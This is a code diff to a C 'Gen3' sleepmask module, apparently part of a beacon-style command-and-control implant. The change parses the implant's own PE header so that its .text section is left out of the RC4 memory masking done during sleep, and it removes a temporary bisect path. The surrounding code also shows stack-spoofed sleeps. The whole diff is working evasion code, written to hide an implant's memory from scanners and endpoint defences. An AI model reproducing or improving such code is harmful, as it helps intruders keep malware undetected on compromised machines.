@@ -9,8 +9,6 @@
  * reason are the spoofed ones for the entire window. */
 #include "sleepmask_gen3.h"
 
-#define G3_BISECT_A  /* temporary: revert after the bisect round */
-
 #if defined(_M_X64)
 
 #include <windows.h>
@@ -71,6 +69,32 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 	HEAP_RECORD * hr = track_memory_get_heap_records_to_mask();
 	DWORD * sec;
 	int n = 0;
+	DWORD text_va = 0, text_end = 0;
+
+	/* The mask engine (this code) lives in beacon .text: an in-place
+	 * encrypt of .text would encrypt our own return path mid-call. The
+	 * official sleepmask BOF survives masking .text only because the BOF
+	 * executes from outside the image; covering .text the same way needs
+	 * this engine copied to a private page (follow-up). Until then .text
+	 * is excluded from the Gen3 range - parse our own PE header for its
+	 * extent (the header page itself is data, still masked). */
+	{
+		unsigned char * pe = (unsigned char *)parms.beacon_ptr;
+		DWORD lfanew = *(DWORD *)(pe + 0x3C);
+		WORD nsec = *(WORD *)(pe + lfanew + 6);
+		WORD optsz = *(WORD *)(pe + lfanew + 20);
+		DWORD secoff = lfanew + 24 + optsz;
+		WORD i;
+		for (i = 0; i < nsec; i++) {
+			unsigned char * so = pe + secoff + (DWORD)i * 40;
+			if (memcmp(so, ".text", 5) == 0) {
+				DWORD vsz = *(DWORD *)(so + 8);
+				text_va = *(DWORD *)(so + 12);
+				text_end = text_va + (vsz ? vsz : *(DWORD *)(so + 16));
+				break;
+			}
+		}
+	}
 
 	sec = (DWORD *)parms.sections;
 	if (sec != NULL) {
@@ -79,9 +103,18 @@ static int g3_snapshot_blocks(G3_BLOCK * out, int max)
 			if (a == 0 && b == 0)
 				break;
 			if (b > a) {
-				out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
-				out[n].len = b - a;
-				n++;
+				BOOL overlaps_text = (a < text_end && b > text_va);
+				if (!overlaps_text) {
+					out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
+					out[n].len = b - a;
+					n++;
+				}
+				else if (a < text_va) {
+					/* keep the part below .text (header page) */
+					out[n].ptr = (unsigned char *)parms.beacon_ptr + a;
+					out[n].len = text_va - a;
+					n++;
+				}
 			}
 			sec += 2;
 		}
@@ -416,11 +449,6 @@ BOOL gen3_sleep(DWORD time)
 	for (i = 0; i < nblocks; i++)
 		g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 
-#if defined(G3_BISECT_A)
-	/* bisect round 1: RC4 masking only, plain sleep window */
-	Sleep(time);
-	if (0) {
-#endif
 	if (!g3_stack_spoof_sleep(time)) {
 		/* spoof machinery failed mid-window: unmask first, then serve a
 		 * plain sleep so the caller's contract still holds */
@@ -428,9 +456,6 @@ BOOL gen3_sleep(DWORD time)
 			g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 		Sleep(time);
 	}
-#if defined(G3_BISECT_A)
-	}
-#endif
 
 	/* RC4 twice with the same key restores the plaintext */
 	for (i = 0; i < nblocks; i++)
